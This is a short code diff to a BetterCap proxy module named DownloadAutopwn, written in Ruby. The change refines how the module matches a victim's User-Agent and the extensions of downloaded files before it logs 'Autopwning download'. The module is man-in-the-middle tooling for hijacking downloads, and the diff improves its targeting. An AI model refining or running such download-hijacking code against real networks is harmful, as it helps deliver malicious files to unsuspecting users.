@@ -101,10 +101,10 @@ class DownloadAutopwn < BetterCap::Proxy::HTTP::Module
         @@thisUserAgentList = File.read("#{@@autopwnPath}#{@@thisUserAgent}/user-agents.bettercap").split
         # For every User-Agent string in our list (bettercap-proxy-modules/http/download_autopwn/.../user-agents.bettercap)
         for @@thisUserAgentListing in @@thisUserAgentList
-          # Check if User-Agent is found in our list (bettercap-proxy-modules/http/download_autopwn/.../user-agents.bettercap)
+          # Check if User-Agent is a match
           if request["User-Agent"].include?(@@thisUserAgentListing)
             for @@thisExtension in @@autopwnExtensions
-              if @@autopwnedFile.include?(".#{@@thisExtension}")
+              if @@autopwnedFile.end_with?(".#{@@thisExtension}")
                 # Begin pwnage
                 BetterCap::Logger.raw ""
                 BetterCap::Logger.raw "  #{' '.swap}  Autopwning download...\n"
